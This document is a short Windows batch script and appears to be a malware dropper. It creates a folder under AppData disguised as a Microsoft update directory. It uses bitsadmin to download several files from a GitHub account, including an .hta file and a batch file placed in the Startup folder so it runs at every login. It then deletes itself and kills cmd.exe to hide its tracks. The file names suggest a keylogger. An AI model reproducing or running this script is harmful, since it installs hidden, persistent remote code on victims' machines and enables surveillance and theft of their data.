@echo off

cls

mkdir "%AppData%\Microsoft\Update\User\Services"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrklbg.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.hta" "%AppData%\Microsoft\Update\msrkl.hta"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"

del startup.bat

taskkill /f /im cmd.exe
